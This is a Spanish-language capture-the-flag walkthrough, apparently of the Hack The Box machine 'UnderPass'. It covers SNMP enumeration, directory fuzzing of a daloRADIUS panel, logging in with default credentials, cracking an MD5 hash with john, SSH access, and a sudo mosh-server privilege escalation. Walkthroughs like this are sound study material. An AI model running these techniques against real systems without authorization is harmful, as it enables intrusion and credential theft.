***Fase 1: Reconocimiento***
----------------------------------------------

Haremos un escaneo de la ip para ver que puertos están abiertos y que servicios tiene asociados a ellos.
```
sudo nmap -sSVC --min-rate 7000 -p- -Pn 10.10.11.48 -oN escaneo
```
<img src="Pasted image 20241228134212.png">

```
sudo nmap -sU -sSVC --min-rate 7000 -Pn 10.10.11.48 -oN escaneo
```
<img src="Pasted image 20241228134914.png">

```
sudo nmap -p 161 -sU -sSVC --min-rate 7000 -Pn 10.10.11.48 -oN escaneo
```
<img src="Pasted image 20241228135045.png">

Vemos que está el puerto 161 con el servicio snmp con la versión 2c. Vamos a intentas sacar información pública por aquí:
```
snmpwalk -v 2c -c public 10.10.11.48
```
<img src="Pasted image 20241228133111.png">

Vemos que nos da un correo electrónico y una posible credencial, nos la guardamos por si luego podemos usarla en un servidor daloradius. A continuación, al ver que tiene un servicio web, vamos a ver que nos esconde, para ello introduciermos el dominio en el navegador.
<img src="Pasted image 20241228133242.png">

A continuación, vamos a ver que esconde el servicio daloradius, para ello introducimos lo siguiente en el navegador:
```
http://underpass.htb/daloradius
```

Vemos que nos da la pagina de apache, vamos a realizar un fuzzing para ver si hay algún archivo o directorio oculto.
```
dirsearch -u http://underpass.htb/daloradius
```
<img src="Pasted image 20241228135811.png">

Vemos que hay una carpeta llamada app y otra llamada doc, así que vamos a volver a realizar fuzzing pero en esa carpeta.
```
dirsearch -u http://underpass.htb/daloradius/app
```
<img src="Pasted image 20241228140122.png">

```
dirsearch -u http://underpass.htb/daloradius/doc
```
<img src="Pasted image 20241229114654.png">

Vemos que hay un directorio llamado install, vamos a ver si tiene algún archivo de instalación donde nos de datos claves del la web.
```
dirsearch -u http://underpass.htb/daloradius/doc/install
```
<img src="Pasted image 20241229115146.png">

Si vamos al navegador, y nos dirigimos a la ruta encontrada podremos ver que nos muestra unas credenciales del login.
```
dirsearch -u http://underpass.htb/daloradius/doc/install
```
<img src="Pasted image 20241229115358.png">

***Fase 2: Explotación***
--------------------------------------
Nos dirigimos a la ruta para iniciar sesión y introducimos las credenciales que acabamos de encontrar:
```
http://underpass.htb/daloradius/app/operators/login.php
```
<img src="Pasted image 20241228140226.png">

Vemos que al iniciar sesión tenemos un panel de administración.
<img src="Pasted image 20241229115834.png">

Nos dirigiremos al menú de usuarios para ver si podemos obtener alguna credencial que podamos intentar logear para el servicio ssh.
<img src="Pasted image 20241229120030.png">

Vemos que tenemos el usuario `svcMosh` con una password cifrada, la vamos a copiar y vamos a intentar crackearla. Para ello vamos a averiguar que nivel de cifrado para ello haremos lo siguiente:
```
hash-identifier
```
<img src="Pasted image 20241229120411.png">
<img src="Pasted image 20241229120429.png">

Vemos que nos dice que está cifrado por MD5, ahora vamos a crackearlo con `john`.
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```
<img src="Pasted image 20241229120655.png">

***Fase 3: Intrusión***
-----------------------------------

Una vez tenemos password crackeada vamos a intentar loguearnos con ese usuario mediante el protocolo ssh.
<img src="Pasted image 20241229123506.png">

Vemos que tenemos la intrusión con estas credenciales. 

***Fase 4: Escalada de privilegios***
------------------------------------------------------------

Ahora vamos a ver si hay algún binario con permisos de algún usuario con más privilegios.
```
sudo -l
```
<img src="Pasted image 20241229123855.png">

Vemos que el binario `mosh-server` tienes privilegios de root, vamos a intentar explotarlo.
```
mosh --server="sudo /usr/bin/mosh-server" localhost
```
<img src="Pasted image 20241229124923.png">

Y con esto ya tendremos el control total del servidor.